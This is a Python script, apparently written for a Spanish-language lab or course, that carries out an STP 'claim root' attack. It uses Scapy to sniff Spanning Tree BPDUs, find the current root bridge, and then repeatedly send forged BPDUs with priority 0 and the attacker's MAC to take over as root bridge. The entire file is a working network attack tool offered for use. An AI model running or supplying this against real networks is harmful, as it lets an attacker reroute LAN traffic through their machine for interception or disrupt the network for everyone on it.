#!/usr/bin/env python3

#########################################################
# Ataque:  STP Claim Root Attack
# Autor:   Luiggy Encarnacion
#########################################################

import os
import signal
import sys
import time

from scapy.all import Dot3, LLC, STP, conf, get_if_hwaddr, get_if_list, sendp, sniff

running = True

# ─────────────────────────────────────────
def stop_handler(sig, frame):
    global running
    running = False

# ─────────────────────────────────────────
def require_root():
    if hasattr(os, "geteuid") and os.geteuid() != 0:
        print("  [!] Ejecuta este script con sudo")
        sys.exit(1)

# ─────────────────────────────────────────
WIDTH = 44

def banner(title):
    print()
    print("  ╔" + "═" * WIDTH + "╗")
    print("  ║" + title.center(WIDTH) + "║")
    print("  ╚" + "═" * WIDTH + "╝")

def separator():
    print("  " + "─" * (WIDTH + 2))

def elapsed_str(start):
    elapsed    = int(time.time() - start)
    mins, secs = divmod(elapsed, 60)
    return f"{mins:02d}:{secs:02d}"

# ─────────────────────────────────────────
def select_interface():
    try:
        interfaces = get_if_list()
    except Exception:
        interfaces = []

    if not interfaces:
        print("  [!] No se detectaron interfaces de red.")
        iface = input("  Ingrese el nombre de la interfaz manualmente: ").strip()
        return iface

    print()
    print("  Interfaces de red disponibles:")
    for i, iface in enumerate(interfaces, 1):
        print(f"    [{i}] {iface}")
    print()

    while True:
        seleccion = input("  Seleccione interfaz (número o nombre): ").strip()
        if seleccion.isdigit():
            idx = int(seleccion) - 1
            if 0 <= idx < len(interfaces):
                return interfaces[idx]
            else:
                print("  [!] Número fuera de rango. Intente de nuevo.")
        elif seleccion in interfaces:
            return seleccion
        else:
            print("  [!] Interfaz no válida. Intente de nuevo.")

def solicitar_parametros():
    banner("STP Claim Root Attack")
    print()

    try:
        iface           = select_interface()
        print()
        root_priority   = input("  Ingrese la Root Priority    (ej: 0) : ").strip()
        bridge_priority = input("  Ingrese la Bridge Priority  (ej: 0) : ").strip()
        hello_time      = input("  Ingrese el Hello Time en segundos   : ").strip()
        print()
    except KeyboardInterrupt:
        print()
        print("  [!] Saliendo.")
        sys.exit(0)

    return iface, int(root_priority), int(bridge_priority), int(hello_time)

# ─────────────────────────────────────────
def build_bpdu(src_mac, root_priority, root_mac,
               bridge_priority, bridge_mac, port_id):
    return (
        Dot3(dst="01:80:c2:00:00:00", src=src_mac)
        / LLC(dsap=0x42, ssap=0x42, ctrl=0x03)
        / STP(
            proto      = 0,
            version    = 0,
            bpdutype   = 0,
            bpduflags  = 0,
            rootid     = root_priority,
            rootmac    = root_mac,
            pathcost   = 0,
            bridgeid   = bridge_priority,
            bridgemac  = bridge_mac,
            portid     = port_id,
            age        = 0,
            maxage     = 20,
            hellotime  = 2,
            fwddelay   = 15,
        )
    )

# ─────────────────────────────────────────
def capture_current_root(iface, timeout=5):
    print(f"  [*] Escuchando BPDUs en {iface} ({timeout}s)...")
    captured = []

    def cb(pkt):
        if STP in pkt:
            captured.append((pkt[STP].rootmac, pkt[STP].rootid))

    try:
        sniff(iface=iface, timeout=timeout, prn=cb,
              filter="ether dst 01:80:c2:00:00:00", store=False)
    except Exception:
        pass

    if captured:
        captured.sort(key=lambda x: x[1])
        rootmac, rootid = captured[0]
        print(f"  [*] Root Bridge actual : {rootmac}  (prioridad {rootid})")
        return rootmac, rootid

    print("  [!] No se detectaron BPDUs.")
    print("  [!] Posibles razones:")
    print("       - STP no está habilitado en la red")
    print("       - Interfaz apagada o sin enlace")
    print("       - BPDU Guard activo antes del ataque")
    return None, None

# ─────────────────────────────────────────
def print_summary(sent, start_time):
    elapsed    = max(int(time.time() - start_time), 1)
    mins, secs = divmod(elapsed, 60)

    print()
    banner("Resumen Final")
    print(f"  BPDUs enviados : {sent:,}")
    print(f"  Tiempo activo  : {mins:02d}:{secs:02d}")
    separator()
    print("  [+] Saliendo.")
    print()

# ─────────────────────────────────────────
def stp_attack():
    global running

    require_root()

    # Primero recopilar parámetros — sin signal handlers activos todavía
    IFACE, ROOT_PRIORITY, BRIDGE_PRIORITY, HELLO_TIME = solicitar_parametros()

    # Registrar handlers DESPUÉS de que el usuario haya ingresado los datos
    signal.signal(signal.SIGINT,  stop_handler)
    signal.signal(signal.SIGTERM, stop_handler)

    PORT_ID = 0x8001

    try:
        src_mac = get_if_hwaddr(IFACE)
    except Exception:
        print(f"  [!] No se pudo obtener la MAC de {IFACE}")
        sys.exit(1)

    conf.iface = IFACE
    conf.verb  = 0

    banner("STP Claim Root Attack")
    print(f"  Interfaz        : {IFACE}")
    print(f"  MAC atacante    : {src_mac}")
    print(f"  Root Priority   : {ROOT_PRIORITY}")
    print(f"  Bridge Priority : {BRIDGE_PRIORITY}")
    print(f"  Hello Time      : {HELLO_TIME}s")
    separator()

    original_rootmac, original_rootid = capture_current_root(IFACE, timeout=5)

    if original_rootmac is None:
        print("  [!] Abortando.")
        sys.exit(1)

    separator()
    print(f"  [*] Construyendo BPDU con prioridad {ROOT_PRIORITY}...")
    print(f"  [*] Iniciando reclamo de Root Bridge...")
    print()

    packet = build_bpdu(
        src_mac,
        ROOT_PRIORITY,
        src_mac,
        BRIDGE_PRIORITY,
        src_mac,
        PORT_ID,
    )

    col_t = "Tiempo"
    col_b = "BPDUs"
    print(f"  {col_t:^8}  {col_b:^7}")
    separator()

    sent       = 0
    start_time = time.time()

    while running:
        sendp(packet, iface=IFACE, verbose=False)
        sent += 1

        t = elapsed_str(start_time)
        print(f"  {t:^8}  {sent:>7,}")

        if running:
            time.sleep(HELLO_TIME)

    print_summary(sent, start_time)

# ─────────────────────────────────────────
if __name__ == "__main__":
    stp_attack()
